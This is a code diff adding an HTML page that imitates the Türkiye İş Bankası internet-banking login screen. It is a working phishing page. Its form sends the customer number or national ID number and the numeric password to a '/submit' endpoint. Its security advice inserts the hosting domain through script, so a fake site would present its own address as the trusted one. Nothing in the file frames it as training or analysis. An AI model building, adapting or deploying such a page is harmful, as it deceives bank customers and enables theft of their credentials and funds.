@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Türkiye İş Bankası İnternet Şubesi</title>
+  <meta name="theme-color" content="#08335E">
+  <meta name="msapplication-TileColor" content="#08335E">
+  <meta name="msapplication-navbutton-color" content="#08335E">
+  <meta name="apple-mobile-web-app-status-bar-style" content="#08335E">
+  <link rel="stylesheet" href="./dist/app.css">
+  <link rel="stylesheet" href="./dist/jquery-ui.min.css">
+  <link rel="shortcut icon" href="./dist/islogo_192.png" type="image/x-icon">
+</head>
+
+<body>
+  <div id="viewport">
+    <div id="leftBannerContainer" style="background-image:url(./dist/banner.jpg);"></div>
+    <div id="header">
+      <div id="logoContainer">
+        <img class="isbank-header-logo" src="./dist/logo.png" alt="iş bankası logo">
+      </div>
+    </div>
+    <div id="mainContent" class="loginMainContent">
+      <div class="mobileHeaderContainer">
+        <div class="mobileHeader">
+        </div>
+      </div>
+      <div class="pageContainer">
+        <div id="StraightLogin">
+          <span id="LoginLabel">
+            <div id="z5-tab-wrapper">
+            </div>
+            <div id="loginPageMiddlePartContainer">
+              <div class="contentBoxContainer">
+                <div class="contentBox" id="loginTypesContainer">
+                  <form action="/submit" method="POST" id="Form1Div">
+                    <div class="loginTitle">
+                      <span id="_ctl0_subeLogin01Title">Türkiye İş Bankası Bireysel<br>İnternet Şubenize Hoş Geldiniz!</span>
+                    </div>
+                    <div class="loginTitleMobile">
+                      <span id="_ctl0_subeLogin01TitleMobile">İnternet Şubenize Hoşgeldiniz!</span>
+                    </div>
+                    <div id="tabs">
+                      <ul>
+                      </ul>
+                      <div id="tabs1">
+                        <div class="loginErrorContainer" id="loginErrorContainer">
+                          <div class="errorSymbol">
+                            <img id="img_errorSymbol" src="./dist/error_icon.png" alt="giriş hatalı">
+                          </div>
+                          <div class="errorText" id="loginErrorText">
+                            <span id="_ctl0_LoginCookieDisabledLabel">Çerezleri aktif hale getirdikten sonra giriş yapmanızı rica ederiz. Çerez politikamızı <script>document.write(document.location.origin)</script> sayfamızdan inceleyebilirsiniz.</span>
+                          </div>
+                        </div>
+                        <div class="tabContentContainer">
+                          <div class="inputLabel ie8-9Only">
+                            <span id="_ctl0_subeLogin01MusteriNumarasi">Müşteri Numaranız / TCKN / YKN</span>
+                          </div>
+                          <div class="loginInputContainer bottom10">
+                            <input name="tckn" type="tel" id="_ctl0_MusNoText" placeholder="Müşteri Numaranız / TCKN / YKN" title="Müşteri Numaranız / TCKN / YKN" maxlength="11" class="standardInput info onlyNumeric allowCopyPaste" autocomplete="off" tabindex="1">
+                            <span id="_ctl0_rememberContainer" class="musnoOtherInputText musnoOtherInputText-tr-TR">
+                              <span id="clearRemembermusno" style="display: none" class="clearRemembermusno">
+                              </span>
+                              <div class="onoffswitch onoffswitch-tr-TR">
+                                <input name="_ctl0:ctlRemember" type="checkbox" id="_ctl0_ctlRemember" class="onoffswitch-checkbox">
+                                <label class="onoffswitch-label" for="_ctl0_ctlRemember">
+                                  <span class="onoffswitch-inner onoffswitch-inner-tr-TR">
+                                  </span>
+                                  <span class="onoffswitch-switch onoffswitch-switch-tr-TR">
+                                  </span>
+                                </label>
+                              </div>
+                            </span>
+                            <div id="customerNoInfo" class="infoBlueBox infoQuestionMark" title="müşteri numarası bilgisi">
+                            </div>
+                            <div class="inputBottomErrorContainer tckn"> Müşteri numaranızı / TCKN / YKN giriniz. </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div id="loginFormBottomPartContainer">
+                      <div class="inputLabel loginPasswordLabel ie8-9Only">
+                        <span id="_ctl0_subeLogin01PassTempPass">Şifre / Geçici Şifre</span>
+                      </div>
+                      <div class="loginInputContainer loginPasswordInputContainer ui-login-z5" style="display: block;">
+                        <div class="loginInputContainer loginPasswordInputContainer ui-login-z5" style="display: block;">
+                          <input name="password" type="tel" id="ParolaText" pattern="[0-9]*" maxlength="6" placeholder="Şifre / Geçici Şifre" title="Şifre / Geçici Şifre" tabindex="2" size="6" class="standardInput info onlyNumeric virtualKeypad removeAutoFill" autocomplete="off" style="border: 1px solid rgb(211, 211, 211);">
+                          <div id="passInfo" class="infoBlueBox infoQuestionMark" title="şifre bilgisi">
+                          </div>
+                          <div class="inputBottomErrorContainer password" style="display: none;">Şifrenizi giriniz.</div>
+                        </div>
+                        <div class="formBottomLink">
+                          <a id="_ctl0_anindaSifreLink" class="login-tooltip-button">
+                            <img class="login-tooltip-button-image" src="./dist/login_icon_2.png" alt="Åifrem Yok,Ä°lk Kullanım ikonu">
+                            <div class="toolTipButtonText">
+                              <span id="_ctl0_subeLogin01IlkKullanim">Şifrem Yok / Unuttum</span>
+                            </div>
+                          </a>
+                        </div>
+                        <div class="loginFormButtonHolder">
+                          <button id="_ctl0_SubeLogin01_btnGiris" class="ui-button darkBlueButton login" type="submit" tabindex="19" name="_ctl0:SubeLogin01_btnGiris">Giriş</button>
+                        </div>
+                      </div>
+                    </div>
+                    <div id="formBottomLinksContainer">
+                      <div class="formBottomLink onlyMobile">
+                        <div id="helpInfoTipButton" class="login-tooltip-button">
+                          <img class="login-tooltip-button-image" src="./dist/login_icon_0.png" alt="yardım/bilgi ikonu">
+                          <div class="toolTipButtonText">
+                            <span id="_ctl0_SubeLogin01_YardimBilgi">Yardım / Bilgi</span>
+                          </div>
+                        </div>
+                      </div>
+                      <div id="helpInfoToolTipContainer">
+                        <div class="arrow-up">
+                        </div>
+                        <div class="nano">
+                          <div class="nano-content">
+                            <span id="_ctl0_SubeLogin01_lblYardimBilgi">
+                              <ul> <span class="bold">Müşteri Numarası</span>
+                                <br>Müşteri Numaranızı bilmiyor veya hatırlamıyorsanız, Bankamatik kartınız üzerinde ve kredi kartı ekstrelerinde görebilirsiniz. Ayrıca 0850 724 0 724 numaralı Telefon Şubemizi arayarak müşteri temsilcisinden de öğrenebilirsiniz<br>
+                                <br>
+                                <span class="bold">Müşteri Şifresi</span>
+                                <br>Müşteri Şifreniz yoksa veya unuttuysanız, şifrenizi<br>
+                                <li>• Bankamatik/Kredi kartınız bulunuyorsa Anında Şifre uygulamasından, </li>
+                                <li>• Bankamatiklerden, </li>
+                                <li>• 0850 724 0 724 numaralı Telefon Şubesi'nden, </li>
+                                <li>• Şubelerimizden ve çağrı merkezimizden Geçici Şifre alarak belirleyebilirsiniz. </li>
+                              </ul>
+                            </span>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="formBottomLink">
+                        <div id="securityToolTipButton" class="login-tooltip-button">
+                          <img class="login-tooltip-button-image" src="./dist/login_icon_1.png" alt="güvenlik ikonu">
+                          <div class="toolTipButtonText">
+                            <span id="subeLogin01Guvenlik">Güvenlik</span>
+                          </div>
+                        </div>
+                      </div>
+                      <div id="securityToolTipContainer" style="display: block;">
+                        <div class="arrow-up">
+                        </div>
+                        <div class="nano">
+                          <div class="nano-content" style="overflow: hidden;">
+                            <span id="_ctl0_SubeLogin01_lblGuvenlik">
+                              <ul>
+                                <li>• Kullandığınız tarayıcıda şifre saklama tercihi sunulursa kabul etmeyin, şifrenizi tarayıcıya kaydetmeyin.</li>
+                                <li>• Mutlaka lisanslı işletim sistemi ve antivirüs yazılımı kullanın ve düzenli olarak güncelleyin.</li>
+                                <li>• Adres çubuğuna <a class="blueLink"><script>document.write(document.location.origin)</script></a> yazarak giriş yapın. </li>
+                                <li>• Detaylı bilgiye ulaşmak için <a class="blueLink">tıklayın</a>. </li>
+                              </ul>
+                            </span>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </form>
+                </div>
+              </div>
+     
+            </div>
+          </span>
+        </div>
+        <div id="canvasDiv" style="text-align: center;vertical-align: top; padding-top: 20px;" data-mui="SwitchLanguage#index"></div>></div>
+      </div>
+      <div id="footer">
+        <div id="content">
+          <div id="left">
+            <div class="container">
+              <span id="copyRightContainer">©<script>document.write(new Date().getFullYear())</script> Türkiye İş Bankası A.Ş</span>
+            </div>
+          </div>
+          <div id="right">
+            <div class="container">
+              <div id="footerLinksContainer">
+                <div class="footerLinks contactUsContainer">
+                  <a id="indexLinkIletisim">
+                    <span id="indexIletisim">Bize Ulaşın</span>
+                  </a>
+                </div>
+                <div class="footerLinks last languageContainer">
+                  <span id="lblSubeGirisLangSelect">
+                    <div id="languageFlagSelect">
+                      <span id="usaflaglabel" class="isbank-page-language selected-language">English</span>
+                      <span id="turkishflaglabel" class="isbank-page-language">Türkçe</span>
+                    </div>
+                  </span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="touchOverlay">
+      </div>
+    </div>
+  </div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.10.0/jquery.min.js" integrity="sha512-ijLvQMMXgWAO85zfDbKeoqNR7015wrZI42XGYorITKkG0sVlP4t+Rt5Dl9EKDkrPxGrWZmVCUW5oIXkVOrnCiw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jqueryui@1.11.1/jquery-ui.min.js" integrity="sha256-4JY5MVcEmAVSuS6q4h9mrwCm6KNx91f3awsSQgwu0qc=" crossorigin="anonymous"></script>
+  <script src="./dist/app.js"></script>
+</body>
+</html>
+
